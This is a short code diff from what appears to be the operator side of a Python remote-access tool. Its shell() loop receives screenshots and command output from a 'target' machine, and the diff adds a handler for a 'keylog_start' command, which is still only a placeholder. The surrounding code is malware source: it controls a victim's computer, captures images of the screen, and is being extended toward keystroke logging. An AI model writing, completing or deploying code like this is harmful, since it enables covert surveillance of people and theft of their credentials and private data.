@@ -64,6 +64,9 @@ def shell():
                     f.write(image_decoded)
                     count += 1
 
+        # Starting keylogger
+        elif command[:12] == "keylog_start":
+            continue
         else:
             # result = target.recv(1024) # data type Bytes
             result = reliable_recv() # need decode??? --> nope, already decode in the function
